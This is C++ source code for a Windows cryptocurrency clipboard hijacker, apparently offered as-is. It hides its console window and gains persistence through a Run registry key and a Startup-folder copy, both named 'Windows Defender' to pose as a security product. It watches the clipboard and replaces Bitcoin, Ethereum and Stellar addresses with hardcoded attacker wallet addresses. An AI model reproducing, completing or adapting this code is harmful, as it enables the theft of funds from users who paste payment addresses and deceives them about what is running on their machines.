#define _WIN32_WINNT 0x0500
#include <iostream>
#include <conio.h>
#include <Windows.h>
#include<ctime>
#include<cstdlib>
#include<string>
#include<memory>
#include<vector>
#include <Lmcons.h>

using namespace std;

void clipBoard(const char* output);

int main(int argc, char* argv[]){
	
HWND hWnd = GetConsoleWindow();
ShowWindow( hWnd, SW_HIDE );

BOOL AddClipboardFormatListener(
  HWND hwnd
);

    string argv_str(argv[0]);
    string base = argv_str.substr(0, argv_str.find_last_of("/"));
    
    string s = base;
  

string progPath = s;
HKEY hkey = NULL;
LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key
LONG status = RegSetValueEx(hkey, "Windows Defender", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));

	//string currentDir = "C:\\Users\\LevelsK\\Desktop\\C++\\Test.exe";
	
	//Get OS Username
	TCHAR name [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;
    
    GetUserName( (TCHAR*)name, &size );
    //cout <<name;

	string first = "C:\\Users\\";
	string second = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Defender.exe";
	
	string startup = first + name + second;
//	cout <<startup;
	
	CopyFile(progPath.c_str(), startup.c_str(), true);

up:
	
	system("cls");
while(true){
	
		if (!IsClipboardFormatAvailable(CF_TEXT))
			{
				//cout << "Nothing in Clipboard\n";
				goto up;
				getch();
				//system("pause");
				return 0;
			}
			
		else if (IsClipboardFormatAvailable(CF_TEXT))
			{
				HANDLE clip;
				
				if (OpenClipboard(NULL))
			    clip = GetClipboardData(CF_TEXT);
			   
			    if (clip != NULL)
			    {
			    	GlobalLock(clip);
			    	
			    	if (GlobalLock(clip) != NULL)
			    	{
			    		
			    		GlobalUnlock(clip);
					}
				}
				
				CloseClipboard();
				
				string a;
				a = (char*)clip;
				
				
					//cout <<a<<endl;
					
						string space = " ";	
			
						if(a.find(space) > 500){
							string l = a;
								int b = l.length();
							
								string sym = "~!#$%@^&*()_+\"{}:\"|<>?|/.,;'[]";
								
								if (a.find_first_of(sym) != string::npos) {

								goto up;
											getch();
											//system("pause");
												return 0;  

								}
								else{
								
											if (b == 34)
											{
												string old_btc = a;
											
								  				string btcList [] = {"15dkouxWy7DGadRmp5y3eybfP44rVC5SJW"};
												
												srand(time(0));

												int btcNo = 0 + (rand() % 1);
								  				string new_btc = btcList[btcNo];
												old_btc.replace(old_btc.find(old_btc),old_btc.size(),new_btc); 
												//cout <<old_btc<<"\n";
												
											string output = old_btc;
											clipBoard(output.c_str());
											 
											
											goto up;
											getch();
												return 0;  
											}
											
			
			
											//Request Ether & Request USD PAX
											else if (b == 42)
											{
												
												string str2 ("0x");
												size_t found = a.find(str2);
												
												if (found!=string::npos){
												
												string old_eth = a;
											
												const char* new_eth = "0xfd218c536C57081C8f6Ad7876dc5Ed0ED7eFC2A2";
								  
												old_eth.replace(old_eth.find(old_eth),old_eth.size(),new_eth); 
												//cout <<old_btc<<"\n";
												
												string output = old_eth;
												clipBoard(output.c_str());
												
												
												goto up;
												getch();
												//system("pause");
													return 0;  
												
												}
												else
												{
													goto up;
													getch();
												//system("pause");
													return 0;
												}
												
											}
											
											
											//Request Stellar
											else if (b == 56)
											{
												string old_stel = a;
											
												const char* new_stel = "GAV3BECZEO3Y2EWRPTZC5SR4XKEBLPFDC3QL2V36VMKJKNP7DC27KA24";
								  
												old_stel.replace(old_stel.find(old_stel),old_stel.size(),new_stel); 
												//cout <<old_btc<<"\n";
												
											string output = old_stel;
											clipBoard(output.c_str());
											
											
											goto up;
											getch();
											//system("pause");
												return 0;  
											}
											
											else 
											{
												//cout << "Invalid Address\n";
												//cout <<a<<endl;
												goto up;
												getch();
												//system("pause");
												return 0;
					
											}
									}
							
						}
						
						else
						{
							//cout << "Character with Spaces\n";
							//cout <<a<<endl;
							goto up;
							getch();
							//system("pause");
							return 0;
		
						}
						
				
		
			}
			
			else{
				goto up;
				getch();
				//system("pause");
				return 0;
			}
}
	}
void clipBoard(const char* output)
{	

    const size_t len = strlen(output) + 1;
    HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hMem), output, len);
    GlobalUnlock(hMem);
    OpenClipboard(0);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();	
}

